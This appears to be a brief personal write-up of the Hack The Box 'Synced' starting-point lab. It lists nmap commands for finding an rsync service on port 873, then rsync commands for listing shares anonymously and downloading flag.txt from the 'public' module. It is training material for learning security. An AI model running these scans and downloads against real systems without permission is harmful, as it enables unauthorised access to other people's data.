## Lab Title: Synced
- Date: 2025-08-02
- Duration: ~30 minutes

### Platform: HTB – Starting Point > Tier 0

### 1. Scenario Summary
- To use Rsync with remote machine >> retrieve files & access anonymously

### 2. Findings
- Rsync         >> Remote file transfer & file synchronisation protocol >> with port `873`
- nmap          >> enumeration
    - `nmap -Pn $ip -p- -T4` >> find open ports
    - `nmap -Pn $ip -sV -p T:873` find the service & version
- rsync         >> command utility used to communicate via Rsync protocol
    - For anonymous access >> you do not need to give any credentials
        - `rsync rsync://10.192.29.29/ --list-only` to connect anonymously & list file/shares on the remote target
            - I found that `public` module is available to be accessed
        - `rsync rsync://10.192.29.29/public/` >> I see there flag.txt
        - `rsync rsync://10.192.29.29/public/flag.txt .` >> I downloaded flag.txt in my current dir

### 3. Idea
- Once enumeration is done, rsync is available >> time to use it
- connection to remote host anonymously >> find available shares >>
- Connect to shares >> download them
